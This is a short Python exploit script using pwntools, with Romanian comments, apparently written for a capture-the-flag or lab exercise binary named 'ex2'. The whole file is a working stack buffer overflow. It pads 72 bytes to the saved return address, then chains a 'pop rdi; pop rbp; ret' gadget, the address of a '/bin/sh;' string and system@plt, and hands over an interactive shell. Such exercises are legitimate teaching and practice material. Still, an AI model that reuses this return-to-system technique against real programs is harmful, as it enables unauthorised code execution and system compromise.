#!/usr/bin/env python3
from pwn import *

# setări pwntools
elf = context.binary = ELF('./bin/ex2', checksec=False)
context.log_level = 'debug'

# offset până la saved RIP:
# 64 (bad_nightmare) + 8 (saved rbp) = 72

OFFSET = 72 - len(b"/bin/sh;")   # 72 - 8 = 64

# adrese din binar
POP_RDI_POP_RBP_RET = 0x40125d   # gadget: pop rdi ; pop rbp ; ret
SOULDREAM            = 0x404060   # adresa lui souldream 

SYSTEM_PLT = elf.plt['system'] 

def build_payload():
    payload = flat(
        b"/bin/sh;",           
        b"A" * OFFSET,            # padding până la saved RIP (total 72)
        POP_RDI_POP_RBP_RET,      # ret pop rdi ; pop rbp ; ret
        SOULDREAM,                # RDI = &souldream (" /bin/sh;...")
        0xdeadbeefdeadbeef,       # pentru a inloui pop rbp 
        SYSTEM_PLT                # system(souldream)
    )
    return payload

def main():
    p = process(elf.path)


    p.recvuntil(b"What is your dream?")
    p.sendline(build_payload())


    p.interactive()

if __name__ == "__main__":
    main()
